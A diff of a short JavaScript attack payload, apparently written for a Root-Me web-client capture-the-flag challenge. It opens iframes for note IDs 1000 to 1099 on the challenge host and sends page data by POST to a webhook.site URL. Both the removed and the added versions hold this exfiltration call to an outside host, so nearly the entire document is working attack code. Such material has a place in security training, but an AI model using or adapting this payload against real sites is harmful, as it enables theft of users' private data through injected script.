@@ -1,29 +1,24 @@
 <script>
-const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
-let results = [];
 
-function run(a = 1000, b = 1100) {
+async function run(a = 1000, b = 1100) {
     for (let i = a; i < b; i++) {
         const iframe = document.createElement("iframe");
-        iframe.src = TARGET + i;
-
+        iframe.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}`;
         document.documentElement.appendChild(iframe);
-
-        results.push({
-            id: i,
-            data: iframe.contentDocument ? iframe.contentDocument.documentElement.textContent : ""
-        });
     }
 
-    fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(results)
-    });
-
-    console.log("sent");
+    console.log("run finished");
 }
 
-run();
+run().then(() => {
+    setTimeout(() => {
+        fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(document)
+        });
+        console.log("fetch executed");
+    }, 5000);
+});
 </script>
